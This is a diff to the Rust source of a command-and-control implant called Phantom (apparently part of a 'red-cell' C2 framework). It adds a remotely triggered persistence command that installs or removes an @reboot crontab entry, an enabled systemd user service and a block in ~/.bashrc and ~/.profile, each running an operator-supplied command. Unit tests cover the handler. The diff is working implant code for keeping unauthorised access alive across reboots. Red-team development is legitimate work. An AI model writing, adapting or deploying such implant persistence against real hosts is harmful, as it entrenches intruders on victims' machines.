@@ -14,7 +14,7 @@ use std::time::{SystemTime, UNIX_EPOCH};
 use red_cell_common::demon::{
     DemonCallback, DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonNetCommand,
     DemonPackage, DemonPivotCommand, DemonProcessCommand, DemonSocketCommand, DemonSocketType,
-    DemonTransferCommand,
+    DemonTransferCommand, PhantomPersistMethod, PhantomPersistOp,
 };
 use time::OffsetDateTime;
 use tokio::net::TcpStream as TokioTcpStream;
@@ -909,6 +909,9 @@ pub(crate) async fn execute(
         DemonCommand::CommandPackageDropped => {
             execute_package_dropped(package.request_id, &package.payload, state)?;
         }
+        DemonCommand::CommandPersist => {
+            execute_persist(package.request_id, &package.payload, state).await?;
+        }
         // Windows-only commands: return explicit not-supported errors.
         command @ (DemonCommand::CommandToken
         | DemonCommand::CommandInlineExecute
@@ -930,6 +933,279 @@ pub(crate) async fn execute(
     }
 
     Ok(())
+}
+
+/// Marker appended to every crontab line and shell-rc block managed by Phantom.
+/// Used to identify and remove our entries on request.
+const PERSIST_MARKER: &str = "# red-cell-c2";
+
+/// Unique label used as the systemd user unit name and in the shell-rc block.
+const PERSIST_UNIT_NAME: &str = "red-cell";
+
+/// Handle `CommandPersist` (ID 3000): install or remove a Linux persistence mechanism.
+///
+/// Payload layout (all little-endian):
+/// ```text
+/// u32  method   — PhantomPersistMethod (1=Cron, 2=SystemdUser, 3=ShellRc)
+/// u32  op       — PhantomPersistOp (0=Install, 1=Remove)
+/// str  command  — length-prefixed UTF-8 command string (required for Install,
+///                 ignored for Remove)
+/// ```
+async fn execute_persist(
+    request_id: u32,
+    payload: &[u8],
+    state: &mut PhantomState,
+) -> Result<(), PhantomError> {
+    let mut parser = TaskParser::new(payload);
+
+    let method_raw = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative persist method"))?;
+    let method = PhantomPersistMethod::try_from(method_raw)
+        .map_err(|_| PhantomError::TaskParse("unknown persist method"))?;
+
+    let op_raw = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative persist op"))?;
+    let op = PhantomPersistOp::try_from(op_raw)
+        .map_err(|_| PhantomError::TaskParse("unknown persist op"))?;
+
+    let command_str = match op {
+        PhantomPersistOp::Install => parser.string()?,
+        PhantomPersistOp::Remove => String::new(),
+    };
+
+    let result = match method {
+        PhantomPersistMethod::Cron => persist_cron(op, &command_str).await,
+        PhantomPersistMethod::SystemdUser => persist_systemd_user(op, &command_str).await,
+        PhantomPersistMethod::ShellRc => persist_shell_rc(op, &command_str),
+    };
+
+    match result {
+        Ok(msg) => state.queue_callback(PendingCallback::Output { request_id, text: msg }),
+        Err(msg) => state.queue_callback(PendingCallback::Error { request_id, text: msg }),
+    }
+
+    Ok(())
+}
+
+/// Install or remove an `@reboot` crontab entry.
+///
+/// Install appends `@reboot <command> # red-cell-c2` to the current user's
+/// crontab if the marker is not already present.  Remove filters out any line
+/// containing the marker.
+async fn persist_cron(op: PhantomPersistOp, command: &str) -> Result<String, String> {
+    // Read existing crontab; treat an empty/missing crontab as success.
+    let crontab_output = Command::new("crontab")
+        .args(["-l"])
+        .output()
+        .await
+        .map_err(|e| format!("crontab -l failed: {e}"))?;
+
+    let existing = if crontab_output.status.success() {
+        String::from_utf8_lossy(&crontab_output.stdout).into_owned()
+    } else {
+        // `crontab -l` exits non-zero when there is no crontab — that is fine.
+        String::new()
+    };
+
+    let new_crontab = match op {
+        PhantomPersistOp::Install => {
+            if existing.contains(PERSIST_MARKER) {
+                return Ok("cron persistence entry already present".into());
+            }
+            format!("{existing}@reboot {command} {PERSIST_MARKER}\n")
+        }
+        PhantomPersistOp::Remove => {
+            if !existing.contains(PERSIST_MARKER) {
+                return Ok("cron persistence entry not found — nothing removed".into());
+            }
+            existing
+                .lines()
+                .filter(|l| !l.contains(PERSIST_MARKER))
+                .map(|l| format!("{l}\n"))
+                .collect()
+        }
+    };
+
+    // Write back via `crontab -`.
+    let mut child = Command::new("crontab")
+        .arg("-")
+        .stdin(Stdio::piped())
+        .spawn()
+        .map_err(|e| format!("crontab - spawn failed: {e}"))?;
+
+    {
+        let stdin = child.stdin.as_mut().ok_or_else(|| "crontab stdin unavailable".to_owned())?;
+        tokio::io::AsyncWriteExt::write_all(stdin, new_crontab.as_bytes())
+            .await
+            .map_err(|e| format!("crontab write failed: {e}"))?;
+    }
+
+    let status = child.wait().await.map_err(|e| format!("crontab wait failed: {e}"))?;
+    if !status.success() {
+        return Err(format!("crontab exited with status {status}"));
+    }
+
+    Ok(match op {
+        PhantomPersistOp::Install => "cron persistence entry installed".into(),
+        PhantomPersistOp::Remove => "cron persistence entry removed".into(),
+    })
+}
+
+/// Install or remove a systemd user service unit at
+/// `~/.config/systemd/user/red-cell.service`.
+async fn persist_systemd_user(op: PhantomPersistOp, command: &str) -> Result<String, String> {
+    let home = std::env::var("HOME").map_err(|_| "HOME not set".to_owned())?;
+    let unit_dir = PathBuf::from(&home).join(".config/systemd/user");
+    let unit_path = unit_dir.join(format!("{PERSIST_UNIT_NAME}.service"));
+
+    match op {
+        PhantomPersistOp::Install => {
+            fs::create_dir_all(&unit_dir)
+                .map_err(|e| format!("create {}: {e}", unit_dir.display()))?;
+
+            let unit_content = format!(
+                "[Unit]\n                 Description=Red Cell C2 persistence ({PERSIST_MARKER})\n                 After=default.target\n                 \n                 [Service]\n                 Type=simple\n                 ExecStart={command}\n                 Restart=on-failure\n                 \n                 [Install]\n                 WantedBy=default.target\n"
+            );
+
+            fs::write(&unit_path, unit_content)
+                .map_err(|e| format!("write {}: {e}", unit_path.display()))?;
+
+            // Reload daemon, then enable + start the unit.
+            run_systemctl(&["--user", "daemon-reload"]).await?;
+            run_systemctl(&["--user", "enable", &format!("{PERSIST_UNIT_NAME}.service")]).await?;
+            run_systemctl(&["--user", "start", &format!("{PERSIST_UNIT_NAME}.service")]).await?;
+
+            Ok(format!("systemd user unit installed at {}", unit_path.display()))
+        }
+        PhantomPersistOp::Remove => {
+            if !unit_path.exists() {
+                return Ok("systemd user unit not found — nothing removed".into());
+            }
+
+            // Best-effort stop/disable; ignore errors so we still clean up the file.
+            let _ =
+                run_systemctl(&["--user", "stop", &format!("{PERSIST_UNIT_NAME}.service")]).await;
+            let _ = run_systemctl(&["--user", "disable", &format!("{PERSIST_UNIT_NAME}.service")])
+                .await;
+
+            fs::remove_file(&unit_path)
+                .map_err(|e| format!("remove {}: {e}", unit_path.display()))?;
+
+            run_systemctl(&["--user", "daemon-reload"]).await?;
+
+            Ok(format!("systemd user unit removed from {}", unit_path.display()))
+        }
+    }
+}
+
+/// Run `systemctl` with the given arguments, returning an error string on failure.
+async fn run_systemctl(args: &[&str]) -> Result<(), String> {
+    let status = Command::new("systemctl")
+        .args(args)
+        .status()
+        .await
+        .map_err(|e| format!("systemctl {:?} failed: {e}", args))?;
+    if status.success() {
+        Ok(())
+    } else {
+        Err(format!("systemctl {:?} exited with {status}", args))
+    }
+}
+
+/// Install or remove a persistence stanza in `~/.bashrc` and `~/.profile`.
+///
+/// Install appends a clearly delimited block to both files if the marker is
+/// not already present.  Remove strips the delimited block from both files.
+fn persist_shell_rc(op: PhantomPersistOp, command: &str) -> Result<String, String> {
+    let home = std::env::var("HOME").map_err(|_| "HOME not set".to_owned())?;
+    let targets = [PathBuf::from(&home).join(".bashrc"), PathBuf::from(&home).join(".profile")];
+
+    let begin_marker = format!("# BEGIN {PERSIST_MARKER}");
+    let end_marker = format!("# END {PERSIST_MARKER}");
+
+    let mut touched = Vec::new();
+    let mut already_present = Vec::new();
+    let mut not_found = Vec::new();
+
+    for path in &targets {
+        let existing = if path.exists() {
+            fs::read_to_string(path).map_err(|e| format!("read {}: {e}", path.display()))?
+        } else {
+            String::new()
+        };
+
+        match op {
+            PhantomPersistOp::Install => {
+                if existing.contains(&begin_marker) {
+                    already_present.push(path.display().to_string());
+                    continue;
+                }
+                let block = format!("\n{begin_marker}\n{command}\n{end_marker}\n");
+                let new_content = format!("{existing}{block}");
+                fs::write(path, new_content)
+                    .map_err(|e| format!("write {}: {e}", path.display()))?;
+                touched.push(path.display().to_string());
+            }
+            PhantomPersistOp::Remove => {
+                if !existing.contains(&begin_marker) {
+                    not_found.push(path.display().to_string());
+                    continue;
+                }
+                let new_content = remove_shell_rc_block(&existing, &begin_marker, &end_marker);
+                fs::write(path, new_content)
+                    .map_err(|e| format!("write {}: {e}", path.display()))?;
+                touched.push(path.display().to_string());
+            }
+        }
+    }
+
+    let summary = match op {
+        PhantomPersistOp::Install => {
+            let mut parts = Vec::new();
+            if !touched.is_empty() {
+                parts.push(format!("installed in: {}", touched.join(", ")));
+            }
+            if !already_present.is_empty() {
+                parts.push(format!("already present in: {}", already_present.join(", ")));
+            }
+            parts.join("; ")
+        }
+        PhantomPersistOp::Remove => {
+            let mut parts = Vec::new();
+            if !touched.is_empty() {
+                parts.push(format!("removed from: {}", touched.join(", ")));
+            }
+            if !not_found.is_empty() {
+                parts.push(format!("not found in: {}", not_found.join(", ")));
+            }
+            parts.join("; ")
+        }
+    };
+
+    Ok(format!("shell rc persistence: {summary}"))
+}
+
+/// Remove the `BEGIN … END` block from `text`, returning the modified string.
+fn remove_shell_rc_block(text: &str, begin: &str, end: &str) -> String {
+    let mut result = String::with_capacity(text.len());
+    let mut inside = false;
+
+    for line in text.lines() {
+        if line.trim() == begin {
+            inside = true;
+            continue;
+        }
+        if inside {
+            if line.trim() == end {
+                inside = false;
+            }
+            continue;
+        }
+        result.push_str(line);
+        result.push('\n');
+    }
+
+    result
 }
 
 /// Handle `CommandPackageDropped` (ID 2570): a previously queued packet was
@@ -6133,5 +6409,206 @@ mod tests {
 
         let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
         assert!(result.is_err());
+    }
+
+    // ── Persistence tests ──────────────────────────────────────────────────
+
+    fn persist_payload(method: u32, op: u32, command: &str) -> Vec<u8> {
+        let mut p = Vec::new();
+        p.extend_from_slice(&(method as i32).to_le_bytes());
+        p.extend_from_slice(&(op as i32).to_le_bytes());
+        if op == 0 {
+            // Install: include length-prefixed command string
+            let cmd_bytes = command.as_bytes();
+            p.extend_from_slice(&(cmd_bytes.len() as i32).to_le_bytes());
+            p.extend_from_slice(cmd_bytes);
+        }
+        p
+    }
+
+    #[tokio::test]
+    async fn persist_unknown_method_returns_parse_error() {
+        let payload = persist_payload(99, 0, "/bin/true");
+        let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
+        let mut state = PhantomState::default();
+        let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
+        assert!(result.is_err(), "unknown method must return a parse error");
+    }
+
+    #[tokio::test]
+    async fn persist_unknown_op_returns_parse_error() {
+        let payload = persist_payload(1, 99, "/bin/true");
+        let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
+        let mut state = PhantomState::default();
+        let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
+        assert!(result.is_err(), "unknown op must return a parse error");
+    }
+
+    #[test]
+    fn remove_shell_rc_block_strips_delimited_section() {
+        let text =
+            "line1\nline2\n# BEGIN # red-cell-c2\n/bin/payload\n# END # red-cell-c2\nline3\n";
+        let result =
+            super::remove_shell_rc_block(text, "# BEGIN # red-cell-c2", "# END # red-cell-c2");
+        assert!(result.contains("line1"), "line before block must remain");
+        assert!(result.contains("line3"), "line after block must remain");
+        assert!(!result.contains("/bin/payload"), "command inside block must be removed");
+        assert!(!result.contains("BEGIN"), "begin marker must be removed");
+        assert!(!result.contains("END"), "end marker must be removed");
+    }
+
+    #[test]
+    fn remove_shell_rc_block_no_block_returns_unchanged() {
+        let text = "line1\nline2\n";
+        let result =
+            super::remove_shell_rc_block(text, "# BEGIN # red-cell-c2", "# END # red-cell-c2");
+        assert_eq!(result, "line1\nline2\n");
+    }
+
+    #[tokio::test]
+    async fn persist_shell_rc_install_writes_block_to_tempfiles() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let tmp = TempDir::new().expect("tempdir");
+        let home = tmp.path().to_str().expect("valid path").to_owned();
+        // SAFETY: single-threaded test environment
+
+        unsafe {
+            std::env::set_var("HOME", &home);
+        }
+
+        // Create stub rc files
+        let bashrc = tmp.path().join(".bashrc");
+        let profile = tmp.path().join(".profile");
+        fs::write(&bashrc, "# existing\n").expect("write bashrc");
+        fs::write(&profile, "# existing\n").expect("write profile");
+
+        let payload = persist_payload(3, 0, "/bin/payload"); // ShellRc=3, Install=0
+        let package = DemonPackage::new(DemonCommand::CommandPersist, 42, payload);
+        let mut state = PhantomState::default();
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
+
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Output { request_id, text }] = callbacks.as_slice() else {
+            panic!("expected one Output callback, got: {callbacks:?}");
+        };
+        assert_eq!(*request_id, 42);
+        assert!(text.contains("installed"), "callback must confirm install: {text}");
+
+        let bashrc_content = fs::read_to_string(&bashrc).expect("read bashrc");
+        assert!(bashrc_content.contains("/bin/payload"), ".bashrc must contain payload cmd");
+        assert!(bashrc_content.contains("red-cell-c2"), ".bashrc must contain marker");
+
+        let profile_content = fs::read_to_string(&profile).expect("read profile");
+        assert!(profile_content.contains("/bin/payload"), ".profile must contain payload cmd");
+    }
+
+    #[tokio::test]
+    async fn persist_shell_rc_install_idempotent() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let tmp = TempDir::new().expect("tempdir");
+        let home = tmp.path().to_str().expect("valid path").to_owned();
+        // SAFETY: single-threaded test environment
+
+        unsafe {
+            std::env::set_var("HOME", &home);
+        }
+
+        let bashrc = tmp.path().join(".bashrc");
+        let profile = tmp.path().join(".profile");
+        fs::write(&bashrc, "").expect("write bashrc");
+        fs::write(&profile, "").expect("write profile");
+
+        // Install once
+        let payload = persist_payload(3, 0, "/bin/payload");
+        let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
+        let mut state = PhantomState::default();
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
+        let _ = state.drain_callbacks();
+
+        // Install again — should report already present
+        let payload2 = persist_payload(3, 0, "/bin/payload");
+        let package2 = DemonPackage::new(DemonCommand::CommandPersist, 2, payload2);
+        execute(&package2, &mut PhantomConfig::default(), &mut state).await.expect("execute");
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
+            panic!("expected one Output callback, got: {callbacks:?}");
+        };
+        assert!(
+            text.contains("already present"),
+            "second install must report already-present: {text}"
+        );
+
+        // Verify .bashrc has exactly one block
+        let content = fs::read_to_string(&bashrc).expect("read bashrc");
+        assert_eq!(content.matches("red-cell-c2").count(), 2, "one BEGIN + one END marker");
+    }
+
+    #[tokio::test]
+    async fn persist_shell_rc_remove_strips_block() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let tmp = TempDir::new().expect("tempdir");
+        let home = tmp.path().to_str().expect("valid path").to_owned();
+        // SAFETY: single-threaded test environment
+
+        unsafe {
+            std::env::set_var("HOME", &home);
+        }
+
+        let bashrc = tmp.path().join(".bashrc");
+        let profile = tmp.path().join(".profile");
+        fs::write(&bashrc, "").expect("write bashrc");
+        fs::write(&profile, "").expect("write profile");
+
+        // Install
+        let payload = persist_payload(3, 0, "/bin/payload");
+        let package = DemonPackage::new(DemonCommand::CommandPersist, 1, payload);
+        let mut state = PhantomState::default();
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("install");
+        let _ = state.drain_callbacks();
+
+        // Remove
+        let payload_rm = persist_payload(3, 1, ""); // ShellRc=3, Remove=1
+        let pkg_rm = DemonPackage::new(DemonCommand::CommandPersist, 2, payload_rm);
+        execute(&pkg_rm, &mut PhantomConfig::default(), &mut state).await.expect("remove");
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
+            panic!("expected one Output callback, got: {callbacks:?}");
+        };
+        assert!(text.contains("removed"), "callback must confirm removal: {text}");
+
+        let content = fs::read_to_string(&bashrc).expect("read bashrc");
+        assert!(!content.contains("/bin/payload"), ".bashrc must not contain payload after remove");
+        assert!(!content.contains("red-cell-c2"), ".bashrc must not contain marker after remove");
+    }
+
+    #[tokio::test]
+    async fn persist_shell_rc_remove_when_not_present() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let tmp = TempDir::new().expect("tempdir");
+        // SAFETY: single-threaded test environment
+
+        unsafe {
+            std::env::set_var("HOME", tmp.path().to_str().expect("valid path"));
+        }
+        fs::write(tmp.path().join(".bashrc"), "").expect("write bashrc");
+        fs::write(tmp.path().join(".profile"), "").expect("write profile");
+
+        let payload_rm = persist_payload(3, 1, "");
+        let pkg_rm = DemonPackage::new(DemonCommand::CommandPersist, 5, payload_rm);
+        let mut state = PhantomState::default();
+        execute(&pkg_rm, &mut PhantomConfig::default(), &mut state).await.expect("execute");
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Output { text, .. }] = callbacks.as_slice() else {
+            panic!("expected one Output callback, got: {callbacks:?}");
+        };
+        assert!(text.contains("not found"), "must report not-found: {text}");
     }
 }
